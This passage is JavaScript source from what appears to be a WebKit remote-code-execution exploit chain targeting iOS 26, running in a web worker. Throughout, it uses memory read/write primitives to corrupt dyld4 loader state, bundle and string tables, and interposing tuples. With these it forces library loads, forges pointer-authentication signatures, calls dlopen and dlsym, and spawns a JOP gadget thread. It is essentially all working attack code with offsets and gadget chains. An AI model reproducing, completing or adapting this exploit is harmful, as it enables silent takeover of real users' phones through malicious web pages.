  } else {
    print("[VERIFY] write64: MISSING");
    all_ok = false;
  }
  
  if (p.device_model) {
    print("[VERIFY] device_model: " + p.device_model);
  } else {
    print("[VERIFY] device_model: not set");
  }
  
  if (p.chipset) {
    print("[VERIFY] chipset: " + p.chipset);
  } else {
    print("[VERIFY] chipset: not set");
  }
  
  if (p.slide) {
    print("[VERIFY] slide: " + p.slide.hex());
  } else {
    print("[VERIFY] slide: not set");
  }
  
  if (p.offsets && Object.keys(p.offsets).length > 0) {
    print("[VERIFY] offsets: " + Object.keys(p.offsets).length + " entries");
  } else {
    print("[VERIFY] offsets: empty");
    all_ok = false;
  }
  
  print("[VERIFY] === Primitives Verification " + (all_ok ? "PASSED" : "FAILED") + " ===");
  
  return all_ok;
}

function setup_dyld4_runtime_26() {
  print("=== Setting up dyld4 Runtime State (iOS 26) ===");
  
  try {
    const gAPIs = p.offsets.libdyld__gAPIs;
    if (!gAPIs) {
      print("[dyld4] libdyld__gAPIs offset not found");
      return;
    }
    
    const runtimeState = p.read64(gAPIs);
    p.runtimeState = runtimeState;
    print("[dyld4] RuntimeState at: " + runtimeState.hex());
    
    const runtimeState_vtable = p.read64(runtimeState).noPAC();
    p.runtimeState_vtable = runtimeState_vtable;
    print("[dyld4] RuntimeState vtable: " + runtimeState_vtable.hex());
    
    const dyld_emptySlot = p.read64(runtimeState_vtable).noPAC();
    p.dyld_emptySlot = dyld_emptySlot;
    print("[dyld4] RuntimeState emptySlot: " + dyld_emptySlot.hex());
    
    const runtimeStateLock = p.read64(runtimeState + 0x70n);
    p.runtimeStateLock = runtimeStateLock;
    print("[dyld4] RuntimeState lock: " + runtimeStateLock.hex());
    
    const p_InterposeTupleAll_buffer = runtimeState + 0xb8n;
    p.p_InterposeTupleAll_buffer = p_InterposeTupleAll_buffer;
    print("[dyld4] InterposeTupleAll buffer ptr: " + p_InterposeTupleAll_buffer.hex());
    
    const p_InterposeTupleAll_size = runtimeState + 0xc0n;
    p.p_InterposeTupleAll_size = p_InterposeTupleAll_size;
    print("[dyld4] InterposeTupleAll size ptr: " + p_InterposeTupleAll_size.hex());
    
    const allImagesArray = p.offsets.dyld4__allImagesArray;
    if (allImagesArray) {
      p.allImagesArray = allImagesArray;
      print("[dyld4] allImagesArray at: " + allImagesArray.hex());
      
      try {
        const images_count = p.read32(allImagesArray - 4n);
        print("[dyld4] Loaded images count: " + images_count.toString());
      } catch (e) {
        print("[dyld4] Images count read failed: " + e.message);
      }
    }
    
    print("[dyld4] dyld4 runtime state setup complete");
  } catch (e) {
    print("[dyld4] dyld4 setup error: " + e.message);
  }
  
  print("=== dyld4 Runtime State Setup Complete ===");
}

function setup_memory_utilities_26() {
  print("=== Setting up Memory Utilities (iOS 26) ===");
  
  p.memcpy = function(dst, src, size) {
    for (let i = 0n; i < size; i += 8n) {
      const val = p.read64(src + i);
      p.write64(dst + i, val);
    }
    return dst;
  };
  
  p.memset = function(dst, value, size) {
    const val = BigInt(value) & 0xffn;
    let qword = 0n;
    for (let i = 0; i < 8; i++) {
      qword = (qword << 8n) | val;
    }
    for (let i = 0n; i < size; i += 8n) {
      p.write64(dst + i, qword);
    }
    return dst;
  };
  
  p.memcmp = function(a, b, size) {
    for (let i = 0n; i < size; i += 8n) {
      const va = p.read64(a + i);
      const vb = p.read64(b + i);
      if (va !== vb) {
        return va < vb ? -1 : 1;
      }
    }
    return 0;
  };
  
  p.hex_dump = function(addr, len) {
    let out = "";
    for (let i = 0n; i < len; i += 16n) {
      let line = addr.add(i).hex() + ": ";
      for (let j = 0n; j < 16n; j += 8n) {
        if (i + j < len) {
          const val = p.read64(addr + i + j);
          line += val.toString(16).padStart(16, '0') + " ";
        }
      }
      out += line + "\n";
    }
    return out;
  };
  
  p.align_up = function(addr, align) {
    const align_big = BigInt(align);
    return (addr + align_big - 1n) & ~(align_big - 1n);
  };
  
  p.align_down = function(addr, align) {
    const align_big = BigInt(align);
    return addr & ~(align_big - 1n);
  };
  
  print("[mem] Memory utility functions registered");
  
  p.page_size = 0x4000n;
  print("[mem] Page size: 0x4000 (16KB)");
  
  p.kernel_page_size = 0x4000n;
  print("[mem] Kernel page size: 0x4000 (16KB)");
  
  print("=== Memory Utilities Setup Complete ===");
}

function validate_offsets_26() {
  print("=== Validating iOS 26 Offsets ===");
  
  const required_offsets = [
    "JavaScriptCore__globalFuncParseFloat",
    "JavaScriptCore__jitAllowList",
    "JavaScriptCore__jitAllowList_once",
    "WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts",
    "WebCore__DedicatedWorkerGlobalScope_vtable",
    "libdyld__gAPIs",
    "libsystem_c__atexit_mutex",
    "AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken",
    "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest",
    "AVFAudio__cfstr_SystemLibraryTextToSpeech",
    "Foundation__NSBundleTables_bundleTables_value",
    "CFNetwork__gConstantCFStringValueTable",
    "ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt",
    "ImageIO__gFunc_CMPhotoCompressionSessionAddExif",
    "Security__gSecurityd",
  ];
  
  let missing = [];
  let found = 0;
  
  for (const name of required_offsets) {
    if (p.offsets[name]) {
      found++;
      print("[OFFSET] " + name + ": " + p.offsets[name].hex());
    } else {
      missing.push(name);
      print("[OFFSET] MISSING: " + name);
    }
  }
  
  print("[OFFSET] Found " + found + "/" + required_offsets.length + " required offsets");
  
  if (missing.length > 0) {
    print("[OFFSET] WARNING: Missing " + missing.length + " offsets: " + missing.join(", "));
  } else {
    print("[OFFSET] All required offsets present");
  }
  
  const gadget_offsets = [
    "gadget_control_1_ios26",
    "gadget_control_2_ios26",
    "gadget_control_3_ios26",
    "gadget_loop_1_ios26",
    "gadget_loop_2_ios26",
    "gadget_loop_3_ios26",
    "gadget_set_all_registers_ios26",
    "gadget_pac_skip_ios26",
  ];
  
  let gadgets_found = 0;
  for (const name of gadget_offsets) {
    if (p.offsets[name]) {
      gadgets_found++;
    }
  }
  
  print("[OFFSET] Gadgets found: " + gadgets_found + "/" + gadget_offsets.length);
  
  print("=== Offset Validation Complete ===");
  
  return missing.length === 0;
}

self.onmessage = async function (e) {
  const data = e.data;
  switch (data.type) {
    case 'stage1_ios26':
      {
        host = data.desiredHost || '';
        SERVER_LOG = data.SERVER_LOG !== undefined ? data.SERVER_LOG : true;
        print("inside stage1_ios26 from worker");
        
        if (data.ios26_offsets) {
          print("Received external iOS 26 offsets");
          Object.assign(offsets, data.ios26_offsets);
        }
        
        main_26().then((p_temp) => {
          if(!p_temp || !p_temp.addrof)
          {
            print("Failed rce (iOS 26), retrying if possible");
            main_26();
          } else {
            print("iOS 26 stage1 succeeded, requesting dlopen workers");
            setup_pac_bypass_26();
            setup_jit_sandbox_26();
            setup_dyld4_runtime_26();
            setup_memory_utilities_26();
            verify_rce_primitives_26();
            validate_offsets_26();
            self.postMessage({ type: 'prepare_dlopen_workers' });
          }
        });
        break;
      }
      
    case 'stage1_rce':
      {
        host = data.desiredHost || '';
        SERVER_LOG = data.SERVER_LOG !== undefined ? data.SERVER_LOG : true;
        print("inside stage1_rce from worker (iOS 26)");
        main_26().then((p_temp) => {
          if(!p_temp || !p_temp.addrof)
          {
            print("Failed rce, retrying if possible");
            main_26();
          }
        });
        break;
      }
      
    case 'dlopen_workers_prepared':
      {
        print("dlopen prepared from worker (iOS 26)");
        const { offsets: p_offsets } = p;
        const contexts = p.read64(p_offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
        print(`contexts: ${contexts.hex()}`);
        const contexts_length = p.read64(contexts - 8n) >> 32n;
        print(`contexts_length: ${contexts_length.hex()}`);
        const dlopen_workers = [];
        p.dlopen_workers = dlopen_workers;
        for (let i = 0n; i < contexts_length; ++i) {
          const ptr = contexts + i * 0x30n;
          const key = p.read64(ptr);
          if (!key) continue;
          const context = p.read64(ptr + 0x20n);
          const vtable = p.read64(context).noPAC();
          if (vtable != p_offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
          const script = p.read64(context + 0x150n);
          const workerOrWorkletThread = p.read64(context + 0x160n);
          const thread = p.read64(workerOrWorkletThread + 0x28n);
          const Strong_globalScopeWrapper = p.read64(script + 0x20n);
          const globalScopeWrapper = p.read64(Strong_globalScopeWrapper);
          const butterfly = p.read64(globalScopeWrapper + 8n);
          const id = p.read64(butterfly);
          const bitmap = p.read64(butterfly + 8n);
          if (id == 0xfffe000011111111n || id == 0xfffe000022222222n) {
            p.dlopen_workers.push({
              thread: thread,
              id: id,
              bitmap: bitmap
            });
          } else if (id == 0xfffe000033333333n) {
            p.sub_worker = {
              thread: thread,
              id: id
            };
          }
        }
        const defaultLoader = p.read64(p_offsets.AXCoreUtilities__DefaultLoader);
        print(`defaultLoader: ${defaultLoader.hex()}`);
        if (defaultLoader) {
          const paciza_nullfunc = p.read64(p_offsets.WebCore__softLinkDDDFACacheCreateFromFramework);
          print(`paciza_nullfunc: ${paciza_nullfunc.hex()}`);
          const dispatchSource = p.read64(defaultLoader + 0x18n);
          print(`dispatchSource: ${dispatchSource.hex()}`);
          const dispatchSomething = p.read64(dispatchSource + 0x58n);
          print(`dispatchSomething: ${dispatchSomething.hex()}`);
          const dispatchBlock = p.read64(dispatchSomething + 0x28n);
          print(`dispatchBlock: ${dispatchBlock.hex()}`);
          p.write64(dispatchBlock + 0x20n, paciza_nullfunc);
        }
        const classes = [p_offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, p_offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
        for (let i = 0; i < 2; ++i) {
          const worker = dlopen_workers[i];
          const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
          print(`wrappedBitmap: ${wrappedBitmap.hex()}`);
          const imageBuffer = p.read64(wrappedBitmap + 0x10n);
          print(`imageBuffer: ${imageBuffer.hex()}`);
          p.write64(imageBuffer + 0x20n, classes[i]);
        }
        print('Load TextToSpeech (iOS 26 dyld4)');
        await loadObjcClass_26(p_offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
        print('TextToSpeech Loaded');
        const NSBundleTables = p.read64(p_offsets.Foundation__NSBundleTables_bundleTables_value);
        print(`NSBundleTables: ${NSBundleTables.hex()}`);
        const loadedFrameworks = p.read64(NSBundleTables + 0x20n);
        print(`loadedFrameworks: ${loadedFrameworks.hex()}`);
        const loadedFrameworks_length = p.read64(loadedFrameworks + 0x30n);
        print(`loadedFrameworks_length: ${loadedFrameworks_length.hex()}`);
        const loadedFrameworks_buffer = p.read64(loadedFrameworks + 8n);
        print(`loadedFrameworks_buffer: ${loadedFrameworks_buffer.hex()}`);
        let TextToSpeech_NSBundle;
        for (let i = 0n; i < loadedFrameworks_length; ++i) {
          const bundle = p.read64(loadedFrameworks_buffer + 8n * i);
          if (bundle <= 0x1_00000000n) continue;
          print(`bundle[${i}]: ${bundle.hex()}`);
          const initialPath = p.read64(bundle + 0x28n);
          if (initialPath != p_offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
          TextToSpeech_NSBundle = bundle;
          break;
        }
        print(`TextToSpeech_NSBundle: ${TextToSpeech_NSBundle.hex()}`);
        const TextToSpeech_CFBundle = p.read64(TextToSpeech_NSBundle + 0x10n);
        print(`TextToSpeech_CFBundle: ${TextToSpeech_CFBundle.hex()}`);
        p.TextToSpeech_NSBundle = TextToSpeech_NSBundle;
        p.TextToSpeech_CFBundle = TextToSpeech_CFBundle;
        p.write64(TextToSpeech_NSBundle + 8n, 0x40008n);
        p.write8(TextToSpeech_CFBundle + 0x34n, 0n);
        if (p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) p.write64(p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, p_offsets.libARI_cstring);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x15n);
        p.write64(TextToSpeech_CFBundle + 0x68n, p_offsets.CFNetwork__gConstantCFStringValueTable);
        p.write64(p_offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
        self.postMessage({
          'type': 'trigger_dlopen1'
        });
        break;
      }
    case 'check_dlopen1':
      {
        const { offsets: p_offsets } = p;
        const worker = p.dlopen_workers.find(worker => worker.id == 0xfffe000011111111n);
        print(`worker.thread: ${worker.thread.hex()}`);
        const runtimeState = p.read64(p_offsets.libdyld__gAPIs);
        p.runtimeState = runtimeState;
        print(`runtimeState (dyld4): ${runtimeState.hex()}`);
        const runtimeState_vtable = p.read64(runtimeState).noPAC();
        print(`runtimeState_vtable: ${runtimeState_vtable.hex()}`);
        const dyld_emptySlot = p.read64(runtimeState_vtable).noPAC();
        print(`dyld4_emptySlot: ${dyld_emptySlot.hex()}`);
        const runtimeStateLock = p.read64(runtimeState + 0x70n);
        print(`runtimeStateLock: ${runtimeStateLock.hex()}`);
        p.runtimeStateLock = runtimeStateLock;
        const p_InterposeTupleAll_buffer = runtimeState + 0xb8n;
        p.p_InterposeTupleAll_buffer = p_InterposeTupleAll_buffer;
        const p_InterposeTupleAll_size = runtimeState + 0xc0n;
        p.p_InterposeTupleAll_size = p_InterposeTupleAll_size;
        print(`p_InterposeTupleAll_buffer: ${p_InterposeTupleAll_buffer.hex()}`);
        const stack_bottom = p.read64(worker.thread + 0x10n);
        worker.stack_bottom = stack_bottom;
        print(`stack_bottom: ${stack_bottom.hex()}`);
        const stack_top = p.read64(worker.thread + 0x18n);
        worker.stack_top = stack_top;
        print(`stack_top: ${stack_top.hex()}`);
        p.create_jsstring = function (ptr, size) {
          const res = 'a'.repeat(8);
          const str = p.read64(p.addrof(res) + 8n);
          p.write64(str, size << 32n | 0x1000n);
          p.write64(str + 8n, ptr);
          return res;
        };
        p.efficient_search = function (begin, end, bytes) {
          const needle = String.fromCharCode(...bytes);
          const finder = p.create_jsstring(begin, end - begin);
          while (true) {
            const index = finder.indexOf(needle);
            if (index != -1) {
              print(`index:${index}`);
              return begin + BigInt(index);
            }
          }
        };
        const dyld_offset = p_offsets.dyld4__RuntimeState_emptySlot - dyld_emptySlot - p.slide;
        print(`dyld_offset: ${dyld_offset.hex()}`);
        p.dlopen_from_lambda_ret = p_offsets.dyld4__dlopen_from_lambda_ret - p.slide - dyld_offset;
        print(`p.dlopen_from_lambda_ret: ${p.dlopen_from_lambda_ret.hex()}`);
        print(p.read64(p.dlopen_from_lambda_ret).hex());
        u64[0] = p.dlopen_from_lambda_ret;
        const needle = [u8[0], u8[1], u8[2], u8[3]];
        const search_result = p.efficient_search(stack_top, stack_bottom, needle);
        print(`search_result:${search_result.hex()}`);
        const loader = search_result + 0x78n;
        print(`loader:${loader.hex()}`);
        const interposingTuples = new BigUint64Array(0x100 * 2);
        p.interposingTuples = interposingTuples;
        const interposingTuples_data_ptr = interposingTuples.data();
        print(`interposingTuples_data_ptr:${interposingTuples_data_ptr.hex()}`);
        const prev_metadata = new BigUint64Array(4);
        const prev_metadata_data_ptr = prev_metadata.data();
        p.prev_metadata = prev_metadata;
        p.prev_metadata_data_ptr = prev_metadata_data_ptr;
        print(`prev_metadata_data_ptr:${prev_metadata_data_ptr.hex()}`);
        prev_metadata[0] = prev_metadata_data_ptr;
        prev_metadata[1] = 1n;
        const metadata = new BigUint64Array(4);
        const metadata_data_ptr = metadata.data();
        print(`metadata_data_ptr:${metadata_data_ptr.hex()}`);
        p.metadata1 = metadata;
        metadata[0] = prev_metadata_data_ptr;
        metadata[1] = metadata_data_ptr + 0x10n - interposingTuples_data_ptr | 1n;
        p.write64(loader, p_InterposeTupleAll_buffer - 0x10n);
        p.write64(loader + 8n, metadata_data_ptr + 0x10n);
        if (p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) p.write64(p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
        p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
        p.write64(p.runtimeStateLock + 0x20n, 0n);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, p_offsets.HOMEUI_cstring);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x3bn);
        p.write64(p_offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
        print(`going to load AVSpeechSynthesisVoice (iOS 26)`);
        await loadObjcClass_26(p_offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
        print(`succeeded to load`);
        p.write64(p_offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
        if (p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) p.write64(p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
        p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
        p.write64(runtimeStateLock + 0x20n, 0n);
        p.write64(p.TextToSpeech_NSBundle + 8n, 0x40008n);
        p.write8(p.TextToSpeech_CFBundle + 0x34n, 0n);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, p_offsets.PerfPowerServicesReader_cstring);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5bn);
        self.postMessage({
          'type': 'trigger_dlopen2'
        });
        break;
      }
    case 'check_dlopen2':
      {
        const { offsets: p_offsets } = p;
        print('check_dlopen2 (iOS 26 dyld4)');
        const worker = p.dlopen_workers.find(worker => worker.id == 0xfffe000022222222n);
        print(`worker.thread: ${worker.thread.hex()}`);
        const stack_bottom = p.read64(worker.thread + 0x10n);
        worker.stack_bottom = stack_bottom;
        print(`stack_bottom: ${stack_bottom.hex()}`);
        const stack_top = p.read64(worker.thread + 0x18n);
        worker.stack_top = stack_top;
        print(`stack_top: ${stack_top.hex()}`);
        u64[0] = p.dlopen_from_lambda_ret;
        const needle = [u8[0], u8[1], u8[2], u8[3]];
        const search_result = p.efficient_search(stack_top, stack_bottom, needle);
        print(`search_result:${search_result.hex()}`);
        const loader = search_result + 0x78n;
        print(`loader:${loader.hex()}`);
        const metadata = new BigUint64Array(4);
        const metadata_data_ptr = metadata.data();
        print(`metadata_data_ptr:${metadata_data_ptr.hex()}`);
        p.metadata1 = metadata;
        metadata[0] = p.prev_metadata_data_ptr;
        metadata[1] = metadata_data_ptr + 0x10n - 0x100n | 1n;
        p.write64(loader, p.p_InterposeTupleAll_size - 0x10n);
        p.write64(loader + 8n, metadata_data_ptr + 0x10n);
        p.write64(p_offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
        if (p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) p.write64(p_offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
        p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
        p.write64(p.runtimeStateLock + 0x20n, 0n);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, p_offsets.libGPUCompilerImplLazy_cstring);
        p.write64(p_offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5en);
        await loadObjcClass_26(p_offsets.AVFAudio__OBJC_CLASS__AVSpeechUtterance);
        let interpose_index = 0;
        function interpose(ptr, val) {
          p.interposingTuples[interpose_index++] = val;
          p.interposingTuples[interpose_index++] = ptr;
        }
        interpose(p_offsets.MediaAccessibility__MACaptionAppearanceGetDisplayType, p_offsets.ImageIO__IIOLoadCMPhotoSymbols);
        interpose(p_offsets.CMPhoto__kCMPhotoTranscodeOption_Strips, 0n);
        interpose(p_offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, p_offsets.libGPUCompilerImplLazy__invoker);
        interpose(p_offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, p_offsets.Security__SecKeychainBackupSyncable_block_invoke);
        interpose(p_offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage, p_offsets.Security__SecOTRSessionProcessPacketRemote_block_invoke);
        interpose(p_offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, p_offsets.libdyld__dlopen);
        interpose(p_offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, p_offsets.libdyld__dlsym);
        interpose(p_offsets.CMPhoto__CMPhotoCompressionSessionAddExif, p_offsets.dyld4__signPointer);
        while (p.read64(p.p_InterposeTupleAll_size) != 0x100n);
        print('InterposeTupleAll.size has been written (dyld4)');
        const initMediaAccessibilityMACaptionAppearanceGetDisplayType = p.read64(p_offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
        print(`initMediaAccessibilityMACaptionAppearanceGetDisplayType: ${initMediaAccessibilityMACaptionAppearanceGetDisplayType.hex()}`);
        const paciza_PAL_initPKContact = p.read64(p_offsets.WebCore__PAL_getPKContactClass);
        print(`paciza_PAL_initPKContact: ${paciza_PAL_initPKContact.hex()}`);
        p.write64(p_offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, initMediaAccessibilityMACaptionAppearanceGetDisplayType);
        p.write64(p_offsets.ImageIO__gImageIOLogProc, paciza_PAL_initPKContact);
        p.write64(p_offsets.WebCore__initPKContact_once, 0xffffffffffffffffn);
        p.write64(p_offsets.WebCore__initPKContact_value, 0n);
        self.postMessage({
          type: 'sign_pointers'
        });
        break;
      }
    case 'setup_fcall':
    case 'setup_fcall_26':
      {
        print("Setting up fcall (iOS 26 dyld4)...");
        const { offsets: p_offsets } = p;
        const paciza_invoker = p.read64(p_offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
        print(`paciza_invoker: ${paciza_invoker.hex()}`);
        const paciza_security_invoker_1 = p.read64(p_offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
        print(`paciza_security_invoker_1: ${paciza_security_invoker_1.hex()}`);
        const paciza_security_invoker_2 = p.read64(p_offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
        print(`paciza_security_invoker_2: ${paciza_security_invoker_2.hex()}`);
        const paciza_dlopen = p.read64(p_offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
        print(`paciza_dlopen: ${paciza_dlopen.hex()}`);
        const paciza_dlsym = p.read64(p_offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
        print(`paciza_dlsym: ${paciza_dlsym.hex()}`);
        const paciza_signPointer = p.read64(p_offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
        print(`paciza_signPointer: ${paciza_signPointer.hex()}`);
        const gSecurityd = new BigUint64Array(0x100 / 8);
        const gSecurityd_data_ptr = gSecurityd.data();
        p.write64(p_offsets.Security__gSecurityd, gSecurityd_data_ptr);
        const slowFcallResult = new BigUint64Array(0x10 / 8);
        const slowFcallResult_data_ptr = slowFcallResult.data();
        slowFcallResult[8 / 8] = slowFcallResult_data_ptr - 0x18n;
        p.slowFcallResult = slowFcallResult;
        const invoker_x0 = new BigUint64Array(0x58);
        const invoker_x0_data_ptr = invoker_x0.data();
        const invoker_arg = new BigUint64Array(0x10);
        const invoker_arg_data_ptr = invoker_arg.data();
        invoker_x0[0x20 / 8] = slowFcallResult_data_ptr;
        invoker_arg[0 / 8] = paciza_security_invoker_1;
        invoker_arg[8 / 8] = invoker_x0_data_ptr;
        p.write64(p_offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_arg_data_ptr);
        p.write64(p_offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_invoker);
        function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
          invoker_arg[0 / 8] = paciza_security_invoker_1;
          gSecurityd[0x78 / 8] = pc;
          invoker_x0[0x28 / 8] = x0;
          invoker_x0[0x30 / 8] = x1;
          invoker_x0[0x38 / 8] = x2;
          return new Promise(r => {
            slow_fcall_resolve = r;
            self.postMessage({
              type: 'slow_fcall'
            });
          });
        }
        function slow_fcall_2(pc, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n) {
          invoker_arg[0 / 8] = paciza_security_invoker_2;
          gSecurityd[0xb8 / 8] = pc;
          invoker_x0[0x28 / 8] = x0;
          invoker_x0[0x30 / 8] = x1;
          invoker_x0[0x38 / 8] = x2;
          invoker_x0[0x40 / 8] = x3;
          invoker_x0[0x48 / 8] = x4;
          invoker_x0[0x50 / 8] = x5;
          return new Promise(r => {
            slow_fcall_resolve = r;
            self.postMessage({
              type: 'slow_fcall'
            });
          });
        }
        p.slow_fcall_1 = slow_fcall_1;
        p.slow_fcall_2 = slow_fcall_2;
        const rope_resolver = [];
        function resolve_rope(str) {
          delete rope_resolver[str];
        }
        function slow_dlopen(filename, flags) {
          filename = filename + '\0';
          resolve_rope(filename);
          const name_ptr = p.read64(p.read64(p.addrof(filename) + 8n) + 8n);
          return slow_fcall_1(paciza_dlopen, name_ptr, flags);
        }
        function slow_dlsym(handle, symbol) {
          symbol = symbol + '\0';
          resolve_rope(symbol);
          const symbol_ptr = p.read64(p.read64(p.addrof(symbol) + 8n) + 8n);
          return slow_fcall_1(paciza_dlsym, handle, symbol_ptr);
        }
        const signPointer_self = new BigUint64Array(4);
        const signPointer_self_addr = p.read64(p.addrof(signPointer_self) + 0x10n);
        function slow_pacia(ptr, ctx) {
          signPointer_self[0] = 0x80010000_00000000n | ctx >> 48n << 32n;
          return slow_fcall_1(paciza_signPointer, signPointer_self_addr, ctx, ptr);
        }
        function slow_pacib(ptr, ctx) {
          signPointer_self[0] = 0x80030000_00000000n | ctx >> 48n << 32n;
          return slow_fcall_1(paciza_signPointer, signPointer_self_addr, ctx, ptr);
        }
        // [修复] 真实 PAC 链激活: 覆盖初始恒等实现(1611-1619), 指向 paciza signPointer
        p.pac_sign_ia = slow_pacia;
        p.pac_sign_da = slow_pacib;
        p.pac_sign_ia_addr = function(ptr, ctx_addr) {
          const ctx = p.read64(ctx_addr);
          signPointer_self[0] = 0x80010000_00000000n | ctx >> 48n << 32n;
          return slow_fcall_1(paciza_signPointer, signPointer_self_addr, ctx, ptr);
        };
        const libsystem_pthread = await slow_dlopen('/usr/lib/system/libsystem_pthread.dylib', 1n);
        print(`libsystem_pthread: ${libsystem_pthread.hex()}`);
        const libsystem_malloc = await slow_dlopen("/usr/lib/system/libsystem_malloc.dylib", 0n);
        print(`libsystem_malloc: ${libsystem_malloc.hex()}`);
        const signed_pthread_create = await slow_dlsym(libsystem_pthread, 'pthread_create');
        p_offsets.pthread_create = signed_pthread_create.noPAC();
        print(`signed_pthread_create: ${signed_pthread_create.hex()}`);
        const paciza_malloc = await slow_dlsym(libsystem_malloc, 'malloc');
        p_offsets.malloc = paciza_malloc.noPAC();
        print(`paciza_malloc: ${paciza_malloc.hex()}`);
        const gadget_control_1 = p_offsets.gadget_control_1_ios26;
        print(`gadget_control_1:${gadget_control_1.hex()}`);
        const gadget_control_2 = p_offsets.gadget_control_2_ios26;
        print(`gadget_control_2: ${gadget_control_2.hex()}`);
        const gadget_control_3 = p_offsets.gadget_control_3_ios26;
        print(`gadget_control_3: ${gadget_control_3.hex()}`);
        const gadget_loop_1 = p_offsets.gadget_loop_1_ios26;
        print(`gadget_loop_1: ${gadget_loop_1.hex()}`);
        const gadget_loop_2 = p_offsets.gadget_loop_2_ios26;
        print(`gadget_loop_2: ${gadget_loop_2.hex()}`);
        const gadget_loop_3 = p_offsets.gadget_loop_3_ios26;
        print(`gadget_loop_3: ${gadget_loop_3.hex()}`);
        const gadget_set_all_registers = p_offsets.gadget_set_all_registers_ios26;
        print(`gadget_set_all_registers: ${gadget_set_all_registers.hex()}`);
        const paciza_gadget_loop_1 = await slow_pacia(gadget_loop_1, 0n);
        print(`paciza_gadget_loop_1: ${paciza_gadget_loop_1.hex()}`);
        const paciza_gadget_loop_2 = await slow_pacia(gadget_loop_2, 0n);
        print(`paciza_gadget_loop_2: ${paciza_gadget_loop_2.hex()}`);
        const paciza_gadget_loop_3 = await slow_pacia(gadget_loop_3, 0n);
        print(`paciza_gadget_loop_3: ${paciza_gadget_loop_3.hex()}`);
        const paciza_gadget_control_2 = await slow_pacia(gadget_control_2, 0n);
        print(`paciza_gadget_control_2: ${paciza_gadget_control_2.hex()}`);
        const paciza_gadget_control_3 = await slow_pacia(gadget_control_3, 0n);
        print(`paciza_gadget_control_3: ${paciza_gadget_control_3.hex()}`);
        const paciza_gadget_control_3_4 = await slow_pacia(gadget_control_3 + 4n, 0n);
        print(`paciza_gadget_control_3_4: ${paciza_gadget_control_3_4.hex()}`);
        const paciza_gadget_set_all_registers = await slow_pacia(gadget_set_all_registers, 0n);
        print(`paciza_gadget_set_all_registers: ${paciza_gadget_set_all_registers.hex()}`);
        const jop_thread = new BigUint64Array(0x20 / 8);
        const jop_thread_data_ptr = jop_thread.data();
        const x0_u64 = new BigUint64Array(0x20 / 8);
        const x0 = x0_u64.data();
        x0_u64[8 / 8] = paciza_gadget_loop_3;
        await slow_fcall_2(signed_pthread_create, jop_thread_data_ptr, 0n, paciza_gadget_loop_3, x0);
        print('WebContent fcall thread has been spawned (iOS 26)!!');
        const pthread_node = jop_thread[0];
        print(`pthread_node:${pthread_node.hex()}`);
        const jop_stack_top = p.read64(pthread_node + 0xb8n);
        print(`jop_stack_top:${jop_stack_top.hex()}`);
        const jop_stack_bottom = jop_stack_top + 0x88000n;
        print(`jop_stack_bottom:${jop_stack_bottom.hex()}`);
        const x19_u64 = new BigUint64Array(0x500 / 8);
        const x19_f64 = new Float64Array(x19_u64.buffer);
        const x19 = x19_u64.data();
        print(`x19: ${x19.hex()}`);
        const x22_u64 = new BigUint64Array(0x20 / 8);
        const x22 = x22_u64.data();
